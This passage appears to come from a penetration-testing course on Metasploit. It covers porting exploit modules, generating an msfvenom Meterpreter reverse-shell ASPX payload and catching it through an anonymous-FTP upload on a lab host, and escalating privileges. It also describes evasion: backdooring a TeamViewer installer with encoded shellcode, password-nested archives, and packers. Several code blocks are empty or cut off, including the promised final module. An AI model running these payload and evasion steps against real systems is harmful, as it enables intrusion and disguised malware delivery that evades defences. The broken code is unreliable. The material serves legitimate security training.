Note that the hosted file terminations that end in¬†`.rb`¬†are Ruby scripts that most likely have been crafted specifically for use within¬†`msfconsole`. We can also filter only by¬†`.rb`¬†file terminations to avoid output from scripts that cannot run within¬†`msfconsole`. Note that not all¬†`.rb`¬†files are automatically converted to¬†`msfconsole`¬†modules. Some exploits are written in Ruby without having any Metasploit module-compatible code in them. We will look at one of these examples in the following sub-section.

We have to download the¬†`.rb`¬†file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and¬†`msfconsole`¬†proprietary files are stored is¬†`/usr/share/metasploit-framework`. The critical folders are also symlinked in our home and root folders in the hidden¬†`~/.msf4/`¬†location.

#### MSF - Directory Structure

	ls /usr/share/metasploit-framework/

```text
app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
```

	ls .msf4/

```text
history  local  logos  logs  loot  modules  plugins  store
```

We copy it into the appropriate directory after downloading the¬†[exploit](https://www.exploit-db.com/exploits/9861). Note that our home folder¬†`.msf4`¬†location might not have all the folder structure that the¬†`/usr/share/metasploit-framework/`¬†one might have. So, we will just need to¬†`mkdir`¬†the appropriate folders so that the structure is the same as the original folder so that¬†`msfconsole`¬†can find the new modules. After that, we will be proceeding with copying the¬†`.rb`¬†script directly into the primary location.

Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get¬†`msfconsole`¬†to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.

For example:

-   `nagios3_command_injection.rb`
-   `our_module_here.rb`

#### MSF - Loading Additional Modules at Runtime

	cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
	msfconsole -m /usr/share/metasploit-framework/modules/

#### MSF - Loading Additional Modules

	loadpath /usr/share/metasploit-framework/modules/

Alternatively, we can also launch¬†`msfconsole`¬†and run the¬†`reload_all`¬†command for the newly installed module to appear in the list. After the command is run and no errors are reported, try either the¬†`search [name]`¬†function inside¬†`msfconsole`¬†or directly with the¬†`use [module-path]`¬†to jump straight into the newly installed module.

	reload_all
	use exploit/unix/webapp/nagios3_command_injection 
	show options

Now we are ready to launch it against our target.

### Porting Over Scripts into Metasploit Modules
--------------------------------------------

To adapt a custom Python, PHP, or any type of exploit script to a Ruby module for Metasploit, we will need to learn the Ruby programming language. Note that Ruby modules for Metasploit are always written using hard tabs.

When starting with a port-over project, we do not need to start coding from scratch. Instead, we can take one of the existing exploit modules from the category our project fits in and repurpose it for our current port-over script. Keep in mind to always keep our custom modules organized so that we and other penetration testers can benefit from a clean, organized environment when searching for custom modules.

We start by picking some exploit code to port over to Metasploit. In this example, we will go for¬†[Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746). We will need to download the script,¬†`48746.rb`¬†and proceed to copy it into the¬†`/usr/share/metasploit-framework/modules/exploits/linux/http/`¬†folder. If we boot into¬†`msfconsole`¬†right now, we will only be able to find a single¬†`Bludit CMS`¬†exploit in the same folder as above, confirming that our exploit has not been ported over yet. It is good news that there is already a Bludit exploit in that folder because we will use it as boilerplate code for our new exploit.

#### Porting MSF Modules

	ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit

```text
bludit_upload_images_exec.rb
```

	cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb

At the beginning of the file we copied, which is where we will be filling in our information, we can notice the¬†`include`¬†statements at the beginning of the boilerplate module. These are the mixins mentioned in the¬†`Plugins and Mixins`¬†section, and we will need to change these to the appropriate ones for our module.

If we want to find the appropriate mixins, classes, and methods required for our module to work, we will need to look up the different entries on the¬†[rubydoc rapid7 documentation](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf).

* * * * *

### Writing Our Module
------------------

We will often face a custom-built network running proprietary code to serve its clients during specific assessments. Most of the modules we have at hand do not even make a dent in their perimeter, and we cannot seem to scan and document the target with anything we have correctly. This is where we might find it helpful to dust off our Ruby skills and start coding our modules.

All necessary information about Metasploit Ruby coding can be found on the¬†[Rubydoc.info Metasploit Framework](https://www.rubydoc.info/github/rapid7/metasploit-framework)¬†related page. From scanners to other auxiliary tools, from custom-made exploits to ported ones, coding in Ruby for the Framework is an amazingly applicable skill.

Please look below at a similar module that we can use as boilerplate code for our exploit port-over. This is the¬†[Bludit Directory Traversal Image File Upload Vulnerability](https://www.exploit-db.com/exploits/47699)¬†exploit, which has already been imported into¬†`msfconsole`. Take a moment to acknowledge all the different fields included in the module before the exploit proof-of-concept (`POC`). Note that this code has not been changed in the snippet below to fit our current import but is a direct snapshot of the pre-existing module mentioned above. The information will need to be adjusted accordingly for the new port-over project.

#### Proof-of-Concept - Requirements

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
```

We can look at the¬†`include`¬†statements to see what each one does. This can be done by cross-referencing them with the¬†[rubydoc rapid7 documentation](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf). Below are their respective functions as explained in the documentation:

| Function | Description |
| --- | --- |
| `Msf::Exploit::Remote::HttpClient` | This module provides methods for acting as an HTTP client when exploiting an HTTP server. |
| `Msf::Exploit::PhpEXE` | This is a method for generating a first-stage php payload. |
| `Msf::Exploit::FileDropper` | This method transfers files and handles file clean-up after a session with the target is established. |
| `Msf::Auxiliary::Report` | This module provides methods for reporting data to the MSF DB. |

Looking at their purposes above, we conclude that we will not need the FileDropper method, and we can drop it from the final module code.

We see that there are different sections dedicated to the¬†`info`¬†page of the module, the¬†`options`¬†section. We fill them inappropriately, offering the credit due to the individuals who discovered the exploit, the CVE information, and other relevant details.

#### Proof-of-Concept - Module Information

```ruby
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>

        ],
      'References'     =>

          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-09-07",
      'DefaultTarget'  => 0))
```

After the general identification information is filled in, we can move over to the¬†`options`¬†menu variables:

#### Proof-of-Concept - Functions

```ruby
 register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
      ])
  end
```

Looking back at our exploit, we see that a wordlist will be required instead of the¬†`BLUDITPASS`¬†variable for the module to brute-force the passwords for the same username. It would look something like the following snippet:

```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

The rest of the exploit code needs to be adjusted according to the classes, methods, and variables used in the porting to the Metasploit Framework for the module to work in the end. The final version of the module would look like this:

#### Proof-of-Concept

```ruby
##

## Introduction to MSFVenom

* * * * *

`MSFVenom`¬†is the successor of¬†`MSFPayload`¬†and¬†`MSFEncode`, two stand-alone scripts that used to work in conjunction with¬†`msfconsole`¬†to provide users with highly customizable and hard-to-detect payloads for their exploits.

`MSFVenom`¬†is the result of the marriage between these two tools. Before this tool, we had to pipe (`|`) the result from¬†`MSFPayload`, which was used to generate shellcode for a specific processor architecture and OS release, into¬†`MSFEncode`, which contained multiple encoding schemes used both for removing bad characters from shellcode. This could sometimes cause instability during the runtime - and for evading older Anti-Virus (`AV`) and endpoint Intrusion Prevention / Intrusion Detection (`IPS/IDS`) software.

Nowadays, the two combined tools offer penetration testers a method to quickly craft payloads for different target host architectures and releases while having the possibility to 'clean up' their shellcode so that it does not run into any errors when deployed. The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past.¬†`Heuristic analysis, machine learning, and deep packet inspection`¬†make it much harder for a payload to run through several subsequent iterations of an encoding scheme to evade any good AV software. As seen in the¬†`Payloads`¬†module, submitting a simple payload with the same configuration detailed above yielded a hit rate of¬†`52/65`. In terms of Malware Analysts worldwide, that is a Bingo. (It is still unproven that Malware Analysts worldwide actually say "that is a Bingo".)

* * * * *

### Creating Our Payloads
---------------------

Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port¬†`tcp/80`¬†of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's¬†`/uploads`¬†directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.

Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.

#### Scanning the Target

	nmap -sV -T4 -p- 10.10.10.5

```text
<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### FTP Anonymous Access

	ftp 10.10.10.5

```text
Connected to 10.10.10.5.
220 Microsoft FTP Service


Name (10.10.10.5:root): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.


Password: ******

230 User logged in.
Remote system type is Windows_NT.


ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client

03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Noticing the aspnet_client, we realize that the box will be able to run¬†`.aspx`¬†reverse shells. Luckily for us,¬†`msfvenom`¬†can do just that without any issue.

#### Generating Payload

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

	ls

```text
Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
```

Now, we only need to navigate to¬†`http://10.10.10.5/reverse_shell.aspx`, and it will trigger the¬†`.aspx`¬†payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.

#### MSF - Setting Up Multi/Handler

	msfconsole -q 
	use multi/handler
	show options

```text
Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description

	set LHOST 10.10.14.5

```text

	set LPORT 1337

```text
LPORT => 1337
```

	run

```text
[*] Started reverse TCP handler on 10.10.14.5:1337 
```

* * * * *

### Executing the Payload
---------------------

Now we can trigger the¬†`.aspx`¬†payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our¬†`multi/handler`¬†module, we would have received a connection. We should ensure that our¬†`.aspx`¬†file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.

	http://10.10.10.5/reverse_shell.aspx

#### MSF - Meterpreter Shell

```text
<...SNIP...>
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5

```

	getuid

```text
Server username: IIS APPPOOL\Web


meterpreter > 

[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
```

If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.

* * * * *

### Local Exploit Suggester
-----------------------

As a tip, there is a module called the¬†`Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the¬†`IIS APPPOOL\Web`¬†user, which naturally does not have many permissions. Furthermore, running the¬†`sysinfo`¬†command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.

```

Having these results in front of us, we can easily pick one of them to test out. If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list,¬†`bypassauc_eventvwr`¬†fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option,¬†`ms10_015_kitrap0d`, does the trick.

## Firewall and IDS/IPS Evasion

* * * * *

To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:

-   Endpoint protection
-   Perimeter protection

* * * * *

### Endpoint Protection
-------------------

`Endpoint protection`¬†refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (`DMZ`).

Endpoint protection usually comes in the form of software packs which include¬†`Antivirus Protection`,¬†`Antimalware Protection`¬†(this includes bloatware, spyware, adware, scareware, ransomware),¬†`Firewall`, and¬†`Anti-DDOS`¬†all in one, under the same software package. We are better familiarized with this form than the latter, as most of us are running endpoint protection software on our PCs at home or the workstations at our workplace. Avast, Nod32, Malwarebytes, and BitDefender are just some current names.

* * * * *

#### Perimeter Protection

`Perimeter protection`¬†usually comes in physical or virtualized devices on the network perimeter edge. These¬†`edge devices`¬†themselves provide access¬†`inside`¬†of the network from the¬†`outside`, in other terms, from¬†`public`¬†to¬†`private`.

Between these two zones, on some occasions, we will also find a third one, called the De-Militarized Zone (`DMZ`), which was mentioned previously. This is a¬†`lower-security policy level`¬†zone than the¬†`inside networks'`¬†one, but with a higher¬†`trust level`¬†than the¬†`outside zone`, which is the vast Internet. This is the virtual space where public-facing servers are housed, which push and pull data for public clients from the Internet but are also managed from the inside and updated with patches, information, and other data to keep the served information up to date and satisfy the customers of the servers.

* * * * *

### Security Policies
-----------------

Security policies are the drive behind every well-maintained security posture of any network. They function the same way as ACL (Access Control Lists) do for anyone familiar with the Cisco CCNA educational material. They are essentially a list of¬†`allow`¬†and¬†`deny`¬†statements that dictate how traffic or files can exist within a network boundary. Multiple lists can act upon multiple network parts, allowing for flexibility within a configuration. These lists can also target different features of the network and hosts, depending on where they reside:

-   Network Traffic Policies
-   Application Policies
-   User Access Control Policies
-   File Management Policies
-   DDoS Protection Policies
-   Others

While not all of these categories above might have the words "Security Policy" attached to them, all of the security mechanisms around them operate on the same basic principle, the¬†`allow`¬†and¬†`deny`¬†entries. The only difference is the object target they refer to and apply to. So the question remains, how do we match events in the network with these rules so that the actions mentioned earlier can be taken?

There are multiple ways to match an event or object with a security policy entry:

| Security Policy | Description |
| --- | --- |
| `Signature-based Detection` | The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms. |
| `Heuristic / Statistical Anomaly Detection` | Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms. |
| `Stateful Protocol Analysis Detection` | Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity. |
| `Live-monitoring and Alerting (SOC-based)` | A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead. |

* * * * *

### Evasion Techniques
------------------

Most host-based anti-virus software nowadays relies mainly on¬†`Signature-based Detection`¬†to identify aspects of malicious code present in a software sample. These signatures are placed inside the Antivirus Engine, where they are subsequently used to scan storage space and running processes for any matches. When a piece of unknown software lands on a partition and is matched by the Antivirus software, most Anti-viruses quarantine the malicious program and kill the running process.

How do we circumvent all this heat? We play along with it. The examples shown in the¬†`Encoders`¬†section show that simply encoding payloads using different encoding schemes with multiple iterations is not enough for all AV products. Moreover, merely establishing a channel of communication between the attacker and the victim can raise some alarms with the current capabilities of IDS/IPS products out there.

However, with the MSF6 release, msfconsole can tunnel AES-encrypted communication from any Meterpreter shell back to the attacker host, successfully encrypting the traffic as the payload is sent to the victim host. This mostly takes care of the network-based IDS/IPS. In some rare cases, we might be met with very strict traffic rulesets that flag our connection based on the sender's IP address. The only way to circumvent this is to find the services being let through. An excellent example of this would be the Equifax hack of 2017, where malicious hackers have abused the Apache Struts vulnerability to access a network of critical data servers. DNS exfiltration techniques were used to slowly siphon data out of the network and into the hackers' domain without being noticed for months. To learn more about this attack, visit the links below:

-   [US Government Post-Mortem Report on the Equifax Hack](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
-   [Protecting from DNS Exfiltration](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
-   [Stoping Data Exfil and Malware Spread through DNS](https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf)

Returning to msfconsole, its capability to now sustain AES-encrypted tunnels, together with Meterpreter's feature of running in memory, raises our capability by a margin. However, we still have the issue of what happens to a payload once it reaches its destination, before it is run and placed into memory. This file could be fingerprinted for its signature, matched against the database, and blocked, together with our chances of accessing the target. We can also be sure that AV software developers are looking at msfconsole modules and capabilities to add the resulting code and files to their signature database, resulting in most if not all of the default payloads being immediately shut down by AV software nowadays.

We are in luck because¬†`msfvenom`¬†offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use¬†`any`¬†executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. There are many valid combinations between actual, legitimate executable files, our different encoding schemes (and their iterations), and our different payload shellcode variants. This generates what is called a backdoored executable.

Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:

	msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

```

	ls

```text
Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
```

For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the¬†`-k`¬†flag as it appears above. However, even with the¬†`-k`¬†flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.

* * * * *

### Archives
--------

Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.

Now, try archiving it two times, passwording both archives upon creation, and removing the¬†`.rar`/`.zip`/`.7z`¬†extension from their names. For this purpose, we can install the¬†[RAR utility](https://www.rarlab.com/download.htm)¬†from RARLabs, which works precisely like WinRAR on Windows.

#### Archiving the Payload

	wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
	tar -xzvf rarlinux-x64-612.tar.gz && cd rar
	rar a ~/test.rar -p ~/test.js

As we can see from the above, this is an excellent way to transfer data both¬†`to`¬†and¬†`from`¬†the target host.

* * * * *

### Packers
-------

The term¬†`Packer`¬†refers to the result of an¬†`executable compression`¬†process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

A list of popular packer software:

| MEW | Themida |  |

* * * * *

### Exploit Coding
--------------

When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.

For example, a typical¬†`Buffer Overflow`¬†exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.

When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an¬†`Offset`¬†switch inside the code for the msfconsole module:

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.

For more information about exploit coding, we recommend checking out the¬†[Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit)¬†book from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.

* * * * *

### Recompiling Meterpreter from Source Code
----------------------------------------

Intrusion Prevention Systems and Antivirus Engines are the most common defender tools that can shoot down an initial foothold on the target. These mainly function on signatures of the whole malicious file or the stub stage.

* * * * *

### A Note on Evasion
-----------------

This section covers evasion at a high level. Be on the lookout for later modules that will dig deeper into the theory and practical knowledge needed to perform evasion more effectively. It is worth trying some of these techniques out on older HTB machines or installing a VM with older versions of Windows Defender or free AV engines, and practicing evasion skills. This is a vast topic that cannot be covered adequately in a single section.

## Metasploit-Framework Updates - August 2020

* * * * *

Updating to MSF6 will render all previous payload sessions unusable if they were established using MSF5. Moreover, payloads generated using MSF5 will not work with MSF6 communication mechanisms. We have summarized the changes and additions that the August 2020 MSFconsole updates brought below.

* * * * *

### Generation Features
-------------------

-   End to end encryption across Meterpreter sessions for all five implementations (Windows, Python, Java, Mettle, and PHP)

-   SMBv3 client support to further enable modern exploitation workflows

-   New polymorphic payload generation routine for Windows shellcode that improves evasive capabilities against common antivirus and intrusion detection system (IDS) products

* * * * *

### Expanded Encryption
-------------------

-   Increased complexity for creation of signature-based detections for certain network operations and Metasploit's main payload binaries

-   All Meterpreter payloads will use AES encryption during communication between the attacker and the target system

-   SMBv3 encryption integration will increase complexity for signature-based detections used to identify key operations performed over SMB

* * * * *

### Cleaner Payload Artifacts
-------------------------

-   DLLs used by the Windows Meterpreter now resolve necessary functions by ordinal instead of name

-   The standard export ReflectiveLoader used by reflectively loadable DLLs is no longer present in the payload binaries as text data

-   Commands that Meterpreter exposes to the Framework are now encoded as integers instead of strings

* * * * *

### Plugins
-------

The old Mimikatz Meterpreter extension was removed in favor of its successor, Kiwi. Therefore, attempts to load Mimikatz will load Kiwi for the foreseeable future.

* * * * *

### Payloads
--------

Replaced the shellcode static generation routine with a randomization routine that adds polymorphic properties to this critical stub by shuffling instructions around each time. To read more about these changes and see the full changelog, please¬†[follow this link](https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/).

* * * * *

### Closing Thoughts
----------------

As we have seen in this module, Metasploit is a powerful framework. Though often misused and mislabeled, it can be an important part of our penetration testing arsenal when used correctly. It is highly extensible great for tracking data during an assessment, and excellent for post-exploitation and facilitating pivoting. It is worth experimenting with all of the features Metasploit has to offer; you may find a way that it fits nicely into your workflow. If you prefer to avoid it, that's fine too! There are plenty of tools out there, and we should work with what we are most comfortable with. To get more practice with this tool, check out the HTB boxes tagged at the end of this module, or attempt any box or Academy module target using Metasploit. You can also practice with it (especially its power for pivoting) in the Dante Pro Lab.

### What's Next?

Here are a few suggestions to try out based on the module you 've just completed!
